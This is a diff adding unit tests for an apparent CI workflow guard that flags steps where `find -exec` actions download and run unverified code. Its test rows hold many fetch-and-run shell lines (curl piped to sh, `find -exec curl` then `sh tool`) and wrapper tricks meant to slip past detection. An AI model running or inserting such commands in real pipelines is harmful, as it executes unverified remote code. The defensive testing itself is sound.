@@ -1952,6 +1952,491 @@ class TestEveryActionOfAFindIsRead(unittest.TestCase):
                 self.assertEqual(count > cap, bool(shell_command.unresolved_wrapper(argv)))
 
 
+class TestEveryFindActionIsACommand(unittest.TestCase):
+    """#2935: but for the reader that asks how a stage uses a file (#2918), the guard never saw the
+    command an action of a `find` runs -- the first one too -- so a download an action fetches, a
+    program it runs, or a stream piped into its shell read CLEAN while every parent runs it.
+    `shell_reader.acted()` answers with that command, the `find` unwrapped as a wrapper is, for the
+    readers `ACTED` names and no other; `command()` is `main`'s (round 3). `shell_command.folds` reads
+    a job as `main` does first, then again with each action in its `find`'s place, and the guard
+    REPORTs where either reading holds a defect: `main`'s reading is never lost. An action that runs a
+    check keeps the `find`, and a program an action runs has no shell sure to read it (`unsure`):
+    `find` exits 0 though a `-exec … \\;` command fails, so nothing an action runs is credited."""
+
+    @staticmethod
+    def marked(script):
+        """R or C for `script` under each of the five `shell:` settings."""
+        return "".join("CR"[reported(script, shell)] for shell in SHELLS)
+
+    def test_each_reader_sees_the_action(self):
+        # The #2935 hunt's families, by its ids, every parent running each: a fetch in an action
+        # (F-first-sh, F-later-bash, F-dir-chmod, F-ok-sh, F-sudo-sh), an action's `-c` program
+        # (C-first-stream, C-orfail-file), an action's `-c` running a download (D-first), and a
+        # download piped into the shell an action runs (P-first-sh, P-later-bash).
+        for use in ("find /dev/null -exec curl -fsSLo tool %stool \\;\nsh tool" % URL,
+                    "find /dev/null -exec true \\; -exec curl -fsSLo tool %stool \\;\nbash tool" % URL,
+                    "find . -maxdepth 0 -execdir curl -fsSLo tool %stool \\;\nchmod +x tool && ./tool" % URL,
+                    "echo y > ans\nfind /dev/null -ok curl -fsSLo tool %stool \\; < ans\nsh tool" % URL,
+                    "find /dev/null -exec sudo curl -fsSLo tool %stool \\;\nsh tool" % URL,
+                    "find /dev/null -exec sh -c '%s' \\;" % PIPE,
+                    "find /dev/null -exec false \\; -o -exec bash -c 'curl -fsSLo t %st; sh t' \\;" % URL,
+                    GET + "find /dev/null -exec sh -c 'sh tool' \\;",
+                    "curl -fsSL %si.sh | find /dev/null -exec sh \\;" % URL,
+                    "curl -fsSL %si.sh | find /dev/null -exec true \\; -exec bash -s \\;" % URL):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(use + "\necho done\n", shell))
+
+    # The download as the step fetches it and as an action does: `main` sees the first and not the
+    # second, so a row on the second holds what the folds that read actions read, with no reading of
+    # `main`'s beside it to report in its place (round 3).
+    FETCHED = "find /dev/null -exec curl -fsSLo tool %stool \\;\n" % URL
+
+    def test_nothing_an_action_runs_is_credited(self):
+        # A check an action runs, as its command, in its `-c` program, or read off its shell's standard
+        # input, with the wrong digest or the right one, clears nothing (the hunt's K rows): `main`
+        # reads each so, and the folds that read actions keep it (`_found` keeps the `find` of a
+        # check; `unsure`) -- beside the same check run on its own, which stops the step where `-e`
+        # holds.
+        sums = "echo '%s  tool' > sums\n" % ("a" * 64)
+        for get in (GET, self.FETCHED):
+            self.assertEqual("CCCRR", self.marked(get + sums + "sha256sum -c sums\nsh tool\n"))
+            for check in ("find /dev/null -exec sha256sum -c sums \\;", "find /dev/null -exec sh -c 'sha256sum -c sums' \\;",
+                          "find /dev/null -exec true \\; -exec bash -c 'sha256sum -c sums' \\;",
+                          "find /dev/null -exec sh \\; <<'EOF'\nsha256sum -c sums\nEOF"):
+                with self.subTest(get=get, check=check):
+                    self.assertEqual("RRRRR", self.marked(get + sums + check + "\nsh tool\n"))
+
+    def test_the_roots_still_stand_in_for_the_braces(self):
+        # `use()` asks how a stage uses a file through `command()`, the `find`, so
+        # `workflow_operands.described` reads the action with the `find`'s roots for its `{}` as on
+        # `main` (#2918), in the folds that read actions too: round 3 needs no hunk there.
+        found = wg.job_defects([wg.Step("step", GET + "find . -name tool -exec chmod +x {} \\;\n", None)])
+        self.assertEqual(1, len(found))
+        self.assertIn("making it executable", found[0][1])
+
+    def test_a_find_that_fetches_and_runs_nothing_reads_clean(self):
+        # The hunt's benign finds: nothing downloads, nothing runs a download -- the price, none.
+        for use in ("find . -name '*.pyc' -exec rm -f {} \\;", "find . -type f -exec chmod 644 {} +",
+                    "find . -name '*.sh' -exec bash -n {} \\;", "find . -exec sh -c 'echo \"$1\"' _ {} \\;",
+                    "find . -name x -exec true \\; -exec echo found \\;", "find . -name '*.log' -exec gzip -f {} \\;"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertFalse(reported(use + "\n", shell))
+
+    # Round 2, the round-1 seat's B1 and its price. The download fetched, a wrong digest in `sums`,
+    # and the frames an action runs in, by the seat's probes: first, behind `sudo`, in a `find`
+    # behind `env`, by `-execdir`, and after `-o`.
+    SUMS = "echo '%s  tool' > sums\n" % ("a" * 64)
+    CHECK = "sha256sum -c sums"
+    FRAMES = ("find /dev/null -exec %s \\;", "find /dev/null -exec sudo %s \\;", "env find /dev/null -exec %s \\;",
+              "find . -maxdepth 0 -execdir %s \\;", "find /dev/null -exec false \\; -o -exec %s \\;")
+
+    def marks(self, lines):
+        """R or C under each of the five settings: the download fetched, `lines`, then the run."""
+        return self.marked(GET + self.SUMS + lines + "\nsh tool\n")
+
+    def test_an_action_is_no_stop_of_the_step(self):
+        # B1 of round 1's seat, the status walk (`workflow_function_calls`, which reads a stage's
+        # status off `command()`, the `find`): GNU find 4.9.0 exits 0 whatever a `-exec … \\;` command
+        # returns, and no `find` runs `exit` or `return`, so a check's rescue written as an action
+        # stops nothing and every parent runs the download with the wrong digest. `main` reports each;
+        # round 1 read the action as the rescue written alone (the seat's S01, S02, S05-S07, S13-S15,
+        # S17, E10, E15, E16, T06 and T09) -- the controls below, which read as they did.
+        check, first = self.CHECK, self.FRAMES[0]
+        for frame in self.FRAMES:
+            for rescue in ("%s || " + frame % "false", "%s || " + frame % "exit 1"):
+                with self.subTest(rescue=rescue):
+                    self.assertEqual("RRRRR", self.marks(rescue % check))
+        for rescue in ("%s || " + first % "exit", "%s || " + first % "return 1",
+                       "%s || { echo bad; " + first % "exit 1" + "; }", "%s || { echo bad; " + first % "false" + "; }",
+                       "%s || ( " + first % "exit 1" + " )", "( %s || " + first % "exit 1" + " )",
+                       "%s || " + first % "exit 1" + " || exit 1", "%s || " + first % "exit 1" + " || true",
+                       "set +e\n%s || " + first % "exit 1", "set -e\n%s || " + first % "false",
+                       "f() {\n  %s || " + first % "return 1" + "\n}\nf", "f() {\n  %s || " + first % "false" + "\n}\nf"):
+            with self.subTest(rescue=rescue):
+                self.assertEqual("RRRRR", self.marks(rescue % check))
+        for control, marks in (("%s || exit 1", "CCCCC"), ("%s || false", "CCCRR"), ("%s", "CCCRR"),
+                               ("f() {\n  %s || exit 1\n}\nf", "CCCCC")):
+            with self.subTest(control=control):
+                self.assertEqual(marks, self.marks(control % check))
+
+    def test_an_action_is_no_call_of_a_function(self):
+        # B1 of round 1's seat, the call detection: no `find` runs a shell function, so a function an
+        # action names is not called -- neither as the path to the function holding the check
+        # (`workflow_function_calls`; the seat's S10 and E13) nor as a piped call (`workflow_gating`;
+        # E03, E04, which round 1 read CLEAN under `shell: bash`). Beside each, the call written
+        # alone, read as it was.
+        body = "f() {\n  %s\n}\n" % self.CHECK
+        for frame in self.FRAMES:
+            named = frame % "f"
+            for call in ("g() {\n  %s\n}\ng" % named, "set -e\ng() {\n  %s\n}\ng" % named, named + " | cat",
+                         "{ %s; } | cat" % named, named):
+                with self.subTest(call=call):
+                    self.assertEqual("RRRRR", self.marks(body + call))
+        for control, marks in (("f", "CCCRR"), ("g() {\n  f\n}\ng", "CCCRR"), ("f | cat", "RCRRR")):
+            with self.subTest(control=control):
+                self.assertEqual(marks, self.marks(body + control))
+
+    def test_mains_reading_of_a_find_is_never_lost(self):
+        # Round 3, the round-2 verdict's B1: `main`'s reading is never lost. What the step itself does is
+        # read off `command()`, the `find` -- by every reader `ACTED` does not name -- and `folds` reads
+        # the job as `main` does before it reads an action. The seat's four groups, each REPORT on `main`
+        # and CLEAN at round 2's head while every parent runs it; the words are the seat's.
+        valued = GET + "T=tool\nfind /dev/null -exec %s \\;\nsh %s\n"
+        rows = (
+            # (a) the value readers (`workflow_uses._cleared`, `workflow_values.record`): no `find` sets
+            # or clears a variable of the step's, so the name still holds the download.
+            *(valued % (action, use) for use in ('"$T"', "$T") for action in (
+                "read T", "printf -v T x", "mapfile T", "readarray T", "getopts a T", "command unset T", "command local T",
+                "/usr/bin/unset T", "env read T", "sudo read T")),
+            # (b) the sums-file writer (`workflow_checks._record_writes`): a `tee` an action runs is not
+            # the step's own write of the file its check reads -- here `find` never reaches the action,
+            # and the sums the check reads are the download's own digest, which passes.
+            *(GET + "sha256sum tool > sums\necho '%s  tool' | find %s -exec %s \\;\nsha256sum -c sums\nsh tool\n" % (
+                "a" * 64, test, tee) for test in (". -name nomatch", "/dev/null -false")
+              for tee in ("tee sums", "tee -a sums", "sudo tee sums", "command tee sums")),
+            # (c) the printers (`workflow_printers.producer`, `_passes_through`): what a `find` prints is
+            # its own `-printf` line, whatever its action prints, and the printer in front of it is not
+            # known to arrive intact.
+            *(GET + "echo 'echo hi' | find . -maxdepth 0 -printf 'sh tool\\n' %s \\; | sh\n" % action
+              for action in ("-execdir echo true", "-execdir printf 'true\\n'", "-exec cat", "-exec tee log")),
+            # (d) the `xargs` walk (`workflow_operands.described`): a `find` with an action still hands
+            # `xargs` its walk.
+            *(GET + "find %s | xargs %s\n" % (walk, runner) for runner in ("sh", "-n1 bash") for walk in (
+                "tool -print -exec true \\;", ". -name tool -exec true \\; -print", ". -name tool -exec echo {} \\;")),
+        )
+        for row in rows:
+            with self.subTest(row=row):
+                self.assertEqual("RRRRR", self.marked(row))
+
+    def test_the_folds_read_a_job_as_main_does_before_they_read_an_action(self):
+        # The shape that holds it. `command()` never unwraps a `find`; `acted()` is `command()`
+        # outside a fold that reads actions; and `folds` yields `main`'s folds first -- one for each
+        # action of the `find` with the most (#2918), `acted` the `find` in each -- then, where
+        # `acted` met a `find` with an action in them, the same folds with the action in place. A job
+        # with no such `find` gets no fold more than `main` gives it.
+        import shell_command
+        import shell_wrappers
+        stage = shell_reader.statements("sudo find /dev/null -exec env sh -c x \\; -exec true \\;\n")[0].stages[0]
+        find = ["find", "/dev/null", "-exec", "env", "sh", "-c", "x", ";", "-exec", "true", ";"]
+        self.assertEqual((find, find), (shell_reader.command(stage.argv), shell_reader.acted(stage.argv)))
+        self.assertIs(stage.argv, shell_reader.acted(stage.argv, True))
+        read = []
+        for sure in shell_command.folds(lambda: False):
+            shell_command.find_action(find)                     # as `described` asks: one fold an action
+            read.append((sure, shell_reader.command(stage.argv), shell_reader.acted(stage.argv),
+                         shell_reader.acted(stage.argv, True)))
+        self.assertEqual([False] * 4, [sure for sure, *_ in read])
+        self.assertEqual([find] * 4, [command for _, command, *_ in read])
+        self.assertEqual([find, find, ["sh", "-c", "x"], ["true"]], [acted for *_, acted, _ in read])
+        self.assertEqual([shell_wrappers.Found] * 2, [type(acted[0]) for *_, acted, _ in read[2:]])
+        self.assertTrue(all(own is stage.argv for *_, own in read[:2]))
+        self.assertEqual([["sh", "-c", "x"], ["true"]], [own for *_, own in read[2:]])
+        self.assertEqual(find, shell_reader.acted(stage.argv))  # and `main`'s again, the folds done
+        # Every fold of `main`'s comes first: with a command word bash may expand to nothing beside
+        # the `find`, both of its halves are read with no action in place, then each again with each
+        # of the two actions.
+        half = shell_reader.statements("${X:+/usr/bin/env true} sh -c x\n")[0].stages[0]
+        read = []
+        for _sure in shell_command.folds(lambda: False):
+            read.append((shell_reader.command(half.argv)[0], shell_reader.acted(stage.argv)[0]))
+        self.assertEqual([("true", "find"), ("sh", "find"), ("true", "sh"), ("true", "true"), ("sh", "sh"), ("sh", "true")], read)
+        # A job with no such `find` is read in `main`'s folds alone -- though `acted` was asked about
+        # one outside any fold just before: `folds` starts every job with none met.
+        plain, count = shell_reader.statements("sudo sh -c x\n")[0].stages[0], 0
+        shell_reader.acted(stage.argv)
+        for _sure in shell_command.folds(lambda: False):
+            count += 1
+            self.assertIs(plain.argv, shell_reader.acted(plain.argv, True))
+        self.assertEqual(1, count)
+        # A reader that asks whether a command is known to fail asks `command()`: `find` is not.
+        import workflow_failure_contexts
+        known = [workflow_failure_contexts._known_failure(shell_reader.statements(text)[0])
+                 for text in ("false\n", "find /dev/null -exec false \\;\n", "find /dev/null -exec exit 1 \\;\n")]
+        self.assertEqual([True, False, False], known)
+
+    def test_the_string_walk_hands_command_the_strings_own_words(self):
+        # `workflow_programs._details` keeps its one `command()` call (#2858 pins it), handed
+        # `acted(argv, True)`: the string's own words -- the very list -- wherever no action stands
+        # in their place, so `main`'s reading of a string is `main`'s own call on `main`'s own
+        # argument, and the action's command in a fold that reads actions.
+        import shell_command
+        import shell_wrappers
+        import workflow_programs
+        from unittest import mock
+        text = "find /dev/null -exec sh \\;"
+        argv = shell_reader.statements("bash -c '%s'\n" % text)[0].stages[0].argv
+        own, handed, real = workflow_programs._parsed(text)[0].stages[0].argv, [], shell_reader.command
+
+        def command(words):
+            handed.append(words)
+            return real(words)
+        with mock.patch.object(shell_reader, "command", command):
+            workflow_programs._details(argv, 0, workflow_programs._MAIN)
+            with mock.patch.dict(shell_command._ACTIONS, act=True):
+                workflow_programs._details(argv, 0, workflow_programs._MAIN)
+        self.assertEqual(2, len(handed))
+        self.assertIs(own, handed[0])
+        self.assertEqual((["sh"], shell_wrappers.Found), (handed[1], type(handed[1][0])))
+
+    # Every caller of the unwrapped reading, as (module, function), with the row that needs it there:
+    # CLEAN on `main`, REPORT here, and CLEAN again where that one caller reads `command()` instead.
+    ACTED = {
+        ("workflow_forms", "flattened"): "find /dev/null -exec sh -c '%s' \\;\n" % PIPE,
+        ("workflow_guard", "_walk"): FETCHED + "sh tool\n",
+        ("workflow_guard", "_unread_stdin"): GET + "T=tool\nfind /dev/null -exec sh \\; <<EOF\nsh $T\nEOF\n",
+        ("workflow_fetch", "stdout_fetch"): "x=$(find /dev/null -exec curl -fsSL %si.sh \\;)\nsh -c \"$x\"\n" % URL,
+        ("workflow_fetch", "stream_consumer"): "curl -fsSL %si.sh | find /dev/null -exec sh \\;\n" % URL,
+        ("workflow_fetch", "compound_output"): "curl -fsSL %stool | find /dev/null -exec tee tool \\;\nsh tool\n" % URL,
+        ("workflow_programs", "_details"): GET + "bash -c 'find /dev/null -exec sh \\;' <<'EOF'\nsh tool\nEOF\n",
+        ("workflow_programs", "stdin_scripts"): GET + "find /dev/null -exec echo 'sh tool' \\; | sh\n",
+        ("workflow_printers", "producer"): GET + "find /dev/null -exec printf '%s\\n' 'sh tool' \\; | bash\n",
+        ("workflow_printers", "handed"): GET + "T=tool\nfind /dev/null -exec cat \\; <<EOF | sh\nsh $T\nEOF\n",
+        ("workflow_printers", "unspelled"): GET + "X='sh tool'\nfind /dev/null -exec echo \"$X\" \\; | sh\n",
+        ("workflow_printers", "_printer"): GET + "source <(find /dev/null -exec echo 'sh tool' \\;)\n",
+        ("workflow_uses", "copies"): GET + "find /dev/null -exec cp tool t2 \\;\nsh t2\n",
+        ("workflow_uses", "use"): GET + "cat tool | find /dev/null -exec sh \\;\n",
+    }
+
+    def test_every_caller_of_the_unwrapped_reading_is_named(self):
+        # Round 3, the round-2 verdict's B1, ruling 3: read from the AST, not the text. Every mention
+        # of `acted` in the scripts -- a call, a name bound to it, an import, the word in a string --
+        # is its definition, the reader's re-export, or a call `shell_reader.acted(…)` in a function
+        # `ACTED` names, once each; and `finds`, the argument that unwraps, is passed by `acted` alone.
+        import shell_command
+        import ast
+        import pathlib
+        calls, other, finds, chain = [], [], [], []
+        for path in sorted(pathlib.Path(shell_command.__file__).parent.glob("*.py")):
+            tree = ast.parse(path.read_text(encoding="utf-8"))
+            owner = {}
+            for function in ast.walk(tree):
+                if isinstance(function, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
+                    for node in ast.walk(function):
+                        owner.setdefault(id(node), []).append(getattr(function, "name", "<lambda>"))
+            called = set()
+            for node in ast.walk(tree):
+                if isinstance(node, ast.Call):
+                    finds += [(path.stem, owner.get(id(node), ["<module>"])[-1]) for word in node.keywords if word.arg == "finds"]
+                    function = node.func
+                    if isinstance(function, ast.Name) and function.id == "producer":
+                        chain.append((path.stem, owner.get(id(node), ["<module>"])[-1]))
+                    if (isinstance(function, ast.Attribute) and function.attr == "acted"
+                            and isinstance(function.value, ast.Name) and function.value.id == "shell_reader"):
+                        calls.append((path.stem, owner.get(id(node), ["<module>"])[-1]))
+                        called.add(id(function))
+            for node in ast.walk(tree):
+                named = (isinstance(node, ast.Name) and node.id == "acted"
+                         or isinstance(node, ast.Attribute) and node.attr == "acted" and id(node) not in called
+                         or isinstance(node, ast.alias) and "acted" in (node.name, node.asname)
+                         or isinstance(node, ast.FunctionDef) and node.name == "acted"
+                         or isinstance(node, ast.arg) and node.arg == "acted"
+                         or isinstance(node, ast.keyword) and node.arg == "acted"
+                         or isinstance(node, ast.Constant) and node.value == "acted")
+                if named:
+                    other.append((path.stem, type(node).__name__))
+        self.assertEqual(sorted(self.ACTED), sorted(calls))
+        self.assertEqual([("shell_command", "FunctionDef"), ("shell_reader", "alias")], sorted(other))
+        self.assertEqual([("shell_command", "acted")], finds)
+        # `workflow_printers.producer` names a stage by what it runs, and each reader that takes its
+        # answer must read that stage as it did: `unspelled` raises where the two differ.
+        self.assertEqual([("workflow_printers", "handed"), ("workflow_printers", "unspelled"),
+                          ("workflow_programs", "stdin_scripts")], sorted(chain))
+        self.assertLessEqual(set(chain), set(self.ACTED))
+
+    def test_each_named_caller_has_a_row_that_needs_it(self):
+        # ... and each is named for a row: one `main` reads CLEAN (its marks, taken on `29505c8d`, are
+        # what the folds read with no action read anywhere), that reports here under every setting,
+        # and that reads CLEAN again where that caller alone is handed `command()`'s answer.
+        import shell_command
+        import os
+        import sys
+        from unittest import mock
+        real = shell_reader.acted
+
+        def without(module, function):
+            def acted(argv, own=False):
+                frame = sys._getframe(1)
+                if (os.path.basename(frame.f_code.co_filename), frame.f_code.co_name) == (module + ".py", function):
+                    return argv if own else shell_reader.command(argv)
+                return real(argv, own)
+            return mock.patch.object(shell_reader, "acted", acted)
+
+        for (module, function), row in self.ACTED.items():
+            with self.subTest(module=module, function=function):
+                self.assertEqual("RRRRR", self.marked(row))
+                with without(module, function):
+                    self.assertEqual("CCCCC", self.marked(row))
+                with mock.patch.object(shell_command, "_found", lambda argv: None):
+                    self.assertEqual("CCCCC", self.marked(row))
+
+    # Round 3, the round-2 verdict's B2 to B5: every rule that keeps a `find` with an action as `main`
+    # reads it -- that can turn it CLEAN -- fires on sure input alone, and where it is not sure the
+    # step REPORTs. `NOTHING` is the word list, each word with the row it keeps: CLEAN, and REPORT
+    # with the word off the list.
+    NOTHING = {".": "curl -fsSL %si.sh | find /dev/null -exec . /dev/stdin \\;\n" % URL,
+               "source": "curl -fsSL %si.sh | find /dev/null -exec source /dev/stdin \\;\n" % URL,
+               "eval": "find /dev/null -exec eval '%s' \\;\n" % PIPE,
+               "exec": "find /dev/null -exec exec sh -c '%s' \\;\n" % PIPE}
+
+    def test_each_word_no_find_can_run_has_the_row_it_keeps(self):
+        # B2: a shell's `.`, `source`, `eval` and `exec` are no programs, so `find` runs nothing and
+        # the row reads as `main` reads it (the seat's V23). Each word stays for its row; the eighteen
+        # other builtins round 2 listed (`unset`, `builtin`, `local`, `set`, …) are words no reader of
+        # an action follows, and with `command()` `main`'s again no row moves when one is dropped, so
+        # they left the list. `find -exec set +e` is not the step's own posture (V17), list or none.
+        import shell_command
+        from unittest import mock
+        for word, row in self.NOTHING.items():
+            with self.subTest(word=word):
+                self.assertEqual("CCCCC", self.marked(row))
+                with mock.patch.object(shell_command, "_NO_PROGRAM", shell_command._NO_PROGRAM - {word}):
+                    self.assertEqual("RRRRR", self.marked(row))
+        self.assertEqual(set(self.NOTHING), set(shell_command._NO_PROGRAM))     # and no word without a row
+        # `command` is a program on macOS, which runs a builtin too, and stays read; `builtin` is no
+        # program anywhere, and no reader follows the word (both as round 2 read them).
+        self.assertEqual("RRRRR", self.marked("find /dev/null -exec command sh -c '%s' \\;\n" % PIPE))
+        self.assertEqual("CCCCC", self.marked("find /dev/null -exec builtin eval '%s' \\;\n" % PIPE))
+        self.assertEqual("CCCRR", self.marks("find /dev/null -exec set +e \\;\n" + self.CHECK))
+        self.assertEqual("RRRRR", self.marks("set +e\nfind /dev/null -exec set -e \\;\n" + self.CHECK))
+        # What a `find` hands a download to is read as `main` reads it, whatever the action's word (V20, V21).
+        for use in ("exec sh tool", ". ./tool"):
+            self.assertTrue(reported(GET + "find /dev/null -exec %s \\;\n" % use))
+
+    def test_a_builtins_name_is_no_program_only_where_find_looks_it_up(self):
+        # B3: the rule is sure for the action's own first word, written as a bare name -- the one
+        # word `find` looks up. Behind a wrapper that hands its words to a shell (`sudo -s`, `-i`,
+        # `--shell`, `--login`, `doas -s`: sudo 1.9.15p5 passes the command "to the shell as a simple
+        # command using the -c option"), behind any other wrapper, or behind a path (`command` is a
+        # program on macOS, which runs the builtin of its name), it is not, and the action is read:
+        # REPORT, as round 1 read it. Round 2 kept the `find` behind `sudo` too (the seat's 31 rows).
+        for word, row in self.NOTHING.items():
+            for front in ("sudo -s ", "sudo -i ", "sudo --shell ", "sudo --login ", "doas -s ", "sudo ", "env ", "nohup ",
+                          "command ", "/usr/bin/command ", "/usr/bin/", "./"):
+                with self.subTest(word=word, front=front):
+                    self.assertEqual("RRRRR", self.marked(row.replace("-exec " + word, "-exec " + front + word)))
+
+    def test_an_assignment_is_no_program_where_it_names_no_path(self):
+        # `find` looks an assignment up as a program's name, and none is named `X=1`: nothing runs
+        # (CLEAN, as on `main`). One that holds a `/` is a path, which may be a program (round 3), and
+        # one behind `env` or `sudo` is that wrapper's own: both are read.
+        for action, marks in (("X=1 sh -c '%s'", "CCCCC"), ("X= sh -c '%s'", "CCCCC"), ("X+=1 sh -c '%s'", "CCCCC"),
+                              ("X=a/b sh -c '%s'", "RRRRR"), ("X=/usr/bin/env sh -c '%s'", "RRRRR"),
+                              ("env X=1 sh -c '%s'", "RRRRR"), ("sudo X=1 sh -c '%s'", "RRRRR"), ("sh -c '%s'", "RRRRR")):
+            with self.subTest(action=action):
+                self.assertEqual(marks, self.marked("find /dev/null -exec %s \\;\n" % (action % PIPE)))
+
+    def test_an_action_is_read_as_a_command_of_its_own(self):
+        # A `$` word bash may drop in front of a known name, and a shell's default, read in an action
+        # as they read where the step runs them (`main` dropped the one and read the other): round 1
+        # read each as a word behind a wrapper, which reported benign finds (the seat's R15, R16, R18;
+        # 780 of its 785 benign cells). With a download each still reports (R13, R14), and #2918's
+        # reasons stand: a `$` command word, and one behind a wrapper the action runs (R02, R06, R17).
+        for action in ("$SUDO sh -c 'echo hi'", "${SUDO} sh -c 'echo hi'", "${SH:-sh} -c 'echo hi'", "${X:+env} sh -c 'echo hi'"):
+            for shell in SHELLS:
+                with self.subTest(action=action, shell=shell):
+                    self.assertFalse(reported("find /dev/null -exec %s \\;\n" % action, shell))
+                    self.assertTrue(reported("find /dev/null -exec %s \\;\n" % action.replace("echo hi", PIPE), shell))
+        self.assertFalse(reported("find . -name '*.sh' -exec ${SUDO:-} bash -n {} \\;\n"))
+        # A word that begins with a whole reference is the step's own kind too, read by its basename
+        # as `main` reads it (round 3): `$SUDO/usr/bin/env sh -c '…'` is that shell's program.
+        self.assertEqual("CCCCC", self.marked("find /dev/null -exec $SUDO/usr/bin/env sh -c 'echo hi' \\;\n"))
+        self.assertEqual("RRRRR", self.marked("find /dev/null -exec $SUDO/usr/bin/env sh -c '%s' \\;\n" % PIPE))
+        for action, why in (("$X -c '%s'" % PIPE, "`find` runs `$X`"), ("sudo $X sh -c '%s'" % PIPE, "a command `find` runs"),
+                            ("$SUDO chmod +x {}", "`find` runs `$SUDO`")):
+            found = wg.job_defects([wg.Step("step", "find . -name '*.sh' -exec %s \\;\n" % action, None)])
+            self.assertIn(why, " ".join(reason for _name, reason in found))
+
+    def test_a_dollar_word_that_may_hold_a_blank_is_not_read_past(self):
+        # B5: "the `$` word is dropped, and the next word is the command" is sure only for a word
+        # that cannot hold a blank -- one that begins with a whole reference (`_OPTIONAL`), above. A
+        # default or an alternate with a blank is cut where the reader meets it, an operand of
+        # `find`'s, and what is left of it names nothing: `${X:+/usr/bin/env true} sh -c '…'` runs
+        # the shell where `X` is unset (the seat's 244 rows of W8 and HF, CLEAN at round 2's head and
+        # on `main`). The step REPORTs, benign or not -- the price, a command the guard cannot read.
+        for word in ("${X:+/usr/bin/env true}", "${X:-/usr/bin/env true}", "${X:=/usr/bin/env true}", "${X:+env -i}"):
+            for program in ("echo hi", PIPE):
+                with self.subTest(word=word, program=program):
+                    row = "find /dev/null -exec %s sh -c '%s' \\;\n" % (word, program)
+                    self.assertEqual("RRRRR", self.marked(row))
+                    found = wg.job_defects([wg.Step("step", row, None)])
+                    self.assertIn("a command word it or bash decides as it runs", " ".join(why for _name, why in found))
+
+    def test_a_find_an_action_runs_is_kept(self):
+        # `find` ends an action at the first `;` or `{} +`, so a `find` an action runs holds no action
+        # it can run: `acted()` unwraps one `find`, and the reads grow with the depth of a nest, not
+        # as a power of it (round 1: 32, 192, 768, 2,560, 8,192 and 25,600 `_found` calls at depths 1
+        # to 6; round 2: 14 a level; now 2, the named readers' alone, in the folds that read actions).
+        # Each `-exec` of the nest is still read, as an action of the first. Since #2858 the guard
+        # reads a job twice -- `main`'s pass, then the walk's -- so the calls are counted for each
+        # reading, as `TestACallSiteCarriesAFixedNumberOfTimes` counts its carries, and each reading
+        # is held to the bound the one reading had: under 200 for depths 2 and 6 together (6 and 14
+        # now; 46 and 102 at round 2). The readings are counted too, and so is the growth: the same
+        # step for two levels more.
+        import shell_command
+        import shell_wrappers
+        from unittest import mock
+
+        def nest(depth):
+            return "find /dev/null -exec " * depth + "sh -c '%s' " % PIPE + "\\; " * depth + "\n"
+        stage = shell_reader.statements(nest(3))[0].stages[0]
+        with mock.patch.dict(shell_command._ACTIONS, act=True):
+            argv = shell_reader.acted(stage.argv)
+        self.assertEqual(("find", shell_wrappers.Found, 2), (argv[0], type(argv[0]), argv.count("-exec")))
+        counted, found, readings = {}, shell_command._found, TestACallSiteCarriesAFixedNumberOfTimes.PASSES
+        passes = TestACallSiteCarriesAFixedNumberOfTimes.each_pass(counted)
+
+        def count(argv):
+            counted["calls"] = counted.get("calls", 0) + 1
+            return found(argv)
+        with mock.patch.object(shell_command, "_found", count), mock.patch.object(wg, "_job_defects", passes.entered):
+            for depth in (2, 4, 6):
+                self.assertTrue(wg.job_defects([wg.Step("step", nest(depth), None)]))
+        self.assertEqual(3 * readings, len(passes))
+        for reading in range(readings):
+            two, four, six = (passes[at * readings + reading]["calls"] for at in range(3))
+            with self.subTest(reading=reading):
+                self.assertLess(two + six, 200)
+                self.assertEqual(four - two, six - four)
+
+    def test_a_nest_a_wrapper_splits_out_of_one_word_is_not_read_past(self):
+        # B4: "a `find` an action runs holds no action it can run" is sure only for a nest written
+        # word by word, whose every `-exec` is an action of the first `find` and read as one. Where
+        # a wrapper splits the inner `find` out of ONE word (`env -S '…'`), its `;` is its own, it
+        # runs its action, and no word of the outer `find` shows it (the seat's 6 rows, 16 of 16
+        # running). The step REPORTs -- a command the guard cannot read, benign or not.
+        nested = "find /dev/null -exec %s \\;\n"
+        for inner, marks in (("find /dev/null -exec sh -c 'echo hi' \\;", "CCCCC"), ("find /dev/null -exec sh -c '%s' \\;" % PIPE, "RRRRR"),
+                             ("env -S 'find /dev/null -exec echo hi ;'", "RRRRR"),
+                             ("env -S 'find /dev/null -exec sh -c \"%s\" ;'" % PIPE, "RRRRR"),
+                             ("env --split-string='find /dev/null -exec echo hi ;'", "RRRRR"),
+                             ("env -S 'sh -c \"echo hi\"'", "CCCCC"), ("env -S 'sh -c \"%s\"'" % PIPE, "RRRRR"),
+                             ("env find /dev/null -name x", "CCCCC")):
+            with self.subTest(inner=inner):
+                self.assertEqual(marks, self.marked(nested % inner))
+        found = wg.job_defects([wg.Step("step", nested % "env -S 'find /dev/null -exec echo hi ;'", None)])
+        self.assertIn("a `find` a wrapper splits out of one word", " ".join(why for _name, why in found))
+
+    def test_the_command_of_a_find_in_a_fold_that_reads_actions(self):
+        import shell_command
+        import shell_wrappers
+        from unittest import mock
+        stage = shell_reader.statements("find /dev/null -exec env sh -c x \\;\n")[0].stages[0]
+        with mock.patch.dict(shell_command._ACTIONS, act=True):
+            argv = shell_reader.acted(stage.argv)
+            # A check keeps the `find`; so does an empty action.
+            for kept in ("find /dev/null -exec sha256sum -c sums \\;\n", "find /dev/null -exec \\;\n", "find /dev/null -exec env \\;\n"):
+                self.assertEqual("find", shell_reader.acted(shell_reader.statements(kept)[0].stages[0].argv)[0])
+        self.assertEqual((["sh", "-c", "x"], shell_wrappers.Found), (argv, type(argv[0])))
+        # A program an action runs has no sure reader.
+        self.assertEqual([None], [script.reader for script in shell_command.unsure(argv, ["x"])])
+        self.assertEqual((None, "r"), (shell_command.sure_reader(argv, "r"), shell_command.sure_reader(["sh"], "r")))
+        # The reader hands what `N<>` holds to a shell any action runs, whichever one a fold reads (#2918).
+        stage = shell_reader.statements("find /dev/null -exec true \\; -exec sh /dev/fd/3 \\; 3<> tool\n")[0].stages[0]
+        self.assertIn("tool", stage.reads)
+
+
 class TestEachGateOfTheWholeWordHasAVerdict(unittest.TestCase):
     """PR #2856 round 9, the round-8 verdict's F4: each test that confines the whole reading to a
     command word moves a verdict, so each has a row here. Read whole past one, the guard reports
@@ -2360,8 +2845,8 @@ class TestTheUnionReadsBothHalves(unittest.TestCase):
 
